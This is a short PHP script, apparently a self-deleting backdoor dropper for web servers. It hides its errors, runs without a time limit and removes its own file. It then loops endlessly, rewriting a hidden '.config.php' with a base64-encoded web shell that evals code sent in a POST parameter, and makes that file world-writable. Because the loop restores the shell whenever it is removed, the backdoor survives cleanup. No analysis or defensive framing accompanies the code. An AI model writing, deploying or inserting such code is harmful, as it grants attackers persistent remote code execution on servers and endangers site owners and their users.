<?php
 error_reporting(0);
 ignore_user_abort(true);
 set_time_limit(0);
 $file = '.config.php';
 $code = base64_decode('PD9waHAgQGV2YWwoJF9QT1NUWydza3NlYyddKTs/Pg==');
 unlink(__FILE__);
 while(true) {
     if(md5(file_get_contents($file))!==md5($code)) {
         file_put_contents($file, $code);
     }
     system('chmod 777 .config.php');
     usleep(100);
 }
?>